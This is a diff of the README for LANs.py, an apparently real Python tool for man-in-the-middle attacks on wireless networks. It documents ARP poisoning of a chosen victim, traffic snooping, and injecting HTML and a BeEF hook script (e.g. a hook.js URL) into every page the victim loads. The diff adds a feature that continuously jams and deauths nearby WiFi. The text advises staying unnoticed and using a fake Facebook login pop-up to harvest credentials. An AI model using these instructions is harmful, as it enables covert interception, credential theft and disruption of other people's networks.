@@ -5,6 +5,8 @@ Automatically find the most active WLAN users then spy on one of them and/or inj
 
 Individually poisons the ARP tables of the target box, the router and the DNS server if necessary. Does not poison anyone else on the network. Displays all most the interesting bits of their traffic and can inject custom html into pages they visit. Cleans up after itself.
 
+Also can be used to continuosly jam nearby WiFi networks. This has an approximate range of a 1 block radius, but this can vary based off of the strength of your WiFi card. 
+
 
 Prereqs: Linux, python-scapy, python-nfqueue (nfqueue-bindings 0.4-3), aircrack-ng, python-twisted, BeEF (optional), and a wireless card capable of promiscuous mode if you choose not to use the -ip option
 
@@ -96,7 +98,7 @@ python LANs.py -v -d -p -n -na -set -a -r 80.87.128.67 -c '<title>Owned.</title>
 ``` shell
 python LANs.py -h
 ```
-Normal Usage
+Normal Usage:
 
   * -b BEEF_HOOK_URL: copy the BeEF hook URL to inject it into every page the victim visits, eg: -b http://192.168.1.10:3000/hook.js
   
@@ -130,10 +132,11 @@ Normal Usage
   
   * -v: show verbose URLs which do not truncate at 150 characters like -u
 
-Wifi Jamming
+Wifi Jamming:
+
   * -s MAC_Address_to_skip: Specify a MAC address to skip deauthing. Example: -s 00:11:BB:33:44:AA
   * -ch CHANNEL: Limit wifijammer to single channel
-  * -m MAXIMUM: Maximum number of clients to deauth
+  * -m MAXIMUM: Maximum number of clients to deauth. Use if moving around so as to prevent deauthing client/AP pairs outside of current range. 
   * -no: Do not clear the deauth list when the maximum (-m) number of client/AP combos is reached. Must be used in conjunction with -m. Example: -m 10 -n
   * -t TIME_INTERVAL: Time between each deauth packet. Default is maximum. If you see scapy errors like 'no buffer space' try: -t .00001
   * --packets NUMBER: Number of packets to send in each deauth burst. Default is 1 packet. 
@@ -158,14 +161,6 @@ Technical details
 This script uses a python nfqueue-bindings queue wrapped in a Twisted IReadDescriptor to feed packets to callback functions. nfqueue-bindings is used to drop and forward certain packets. Python's scapy library does the work to parse and inject packets.
 
 Injecting code undetected is a dicey game, if a minor thing goes wrong or the server the victim is requesting data from performs things in unique or rare way then the user won't be able to open the page they're trying to view and they'll know something's up. This script is designed to forward packets if anything fails so during usage you may see lots of "[!] Injected packet for www.domain.com" but only see one or two domains on the BEeF panel that the browser is hooked on. This is OK. If they don't get hooked on the first page just wait for them to browse a few other pages. The goal is to be unnoticeable. My favorite BEeF tools are in Commands > Social Engineering. Do things like create an official looking Facebook pop up saying the user's authentication expired and to re-enter their credentials.
-
-NOTE TO UBUNTU USERS: you will need to update/manually install nfqueue-bindings to version 0.4.3 due to the fact the version in Ubuntu's repo is 0.2. Alternatively just edit the Parser.start() function from:
-
-def start(self, payload):
-
-to:
-
-def start(self, i, payload)
 
 ***
 * [danmcinerney.org](danmcinerney.org)
